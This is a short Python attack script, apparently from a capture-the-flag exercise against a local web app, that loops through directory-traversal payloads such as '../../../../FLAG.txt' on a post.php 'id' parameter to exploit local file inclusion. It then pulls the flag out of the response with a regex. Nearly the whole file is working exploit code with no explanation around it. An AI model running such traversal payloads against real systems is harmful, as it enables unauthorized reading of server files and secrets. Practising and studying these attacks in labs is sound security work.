import requests

base_url = "http://127.0.0.1:32891"

print("[+] What if I can include FLAG.txt DIRECTLY through the LFI?")
print("[+] Even though it's in root, maybe there's a way...")

# Since uploads/finder works, maybe there's a relative path that reaches /FLAG.txt
# From /var/www/html/posts/, going up would be:
# ../ = /var/www/html/
# ../../ = /var/www/
# ../../../ = /var/
# ../../../../ = /

flag_lfi_payloads = [
    # Try reaching root from posts directory
    "../../../../../../../FLAG.txt",  # Lots of ../
    "../../../../../../FLAG.txt",
    "../../../../../FLAG.txt",
    "../../../../FLAG.txt",
    "../../../FLAG.txt",
    "../../FLAG.txt",
    "../FLAG.txt",
    
    # Without .txt extension (maybe .md is appended)
    "../../../FLAG",
    "../../../../FLAG",
]

import re

for payload in flag_lfi_payloads:
    print(f"\n[+] Testing: {payload}")
    resp = requests.get(f"{base_url}/post.php", params={'id': payload})
    
    # Check response
    if "FLAG{" in resp.text:
        print(f"[!!!] FOUND FLAG with payload: {payload}!")
        print(f"\nFull response:")
        print(resp.text)
        
        # Extract flag
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        for flag in flags:
            print(f"\n[!!!] EXTRACTED FLAG: {flag}")
        break
    elif "traversal" in resp.text.lower():
        print("Blocked by traversal filter")
    elif "Post not found" in resp.text:
        print("Post not found")
    elif len(resp.text) > 1000:
        print(f"Got large response ({len(resp.text)} bytes)")
        print(f"First 300 chars: {resp.text[:300]}")
    else:
        print(f"Short response: {resp.text}")

